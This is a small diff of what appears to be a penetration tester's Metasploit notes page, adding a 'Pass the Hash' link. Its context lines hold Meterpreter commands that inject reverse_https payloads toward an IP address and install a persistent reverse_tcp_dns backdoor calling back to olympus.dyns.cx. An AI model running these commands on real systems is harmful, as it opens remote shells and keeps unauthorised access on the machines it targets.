@@ -36,6 +36,7 @@ run multi_meter_inject -pt windows/meterpreter/reverse_https -mr 10.128.129.200,
 
 
 # Known Attack Patterns
+[Pass the Hash](/passthehash)
 # Writing Exploits
 # Post Module Tricks
 run persistence -P windows/meterpreter/reverse_tcp_dns -S -i 9000 -p 9998 -r olympus.dyns.cx
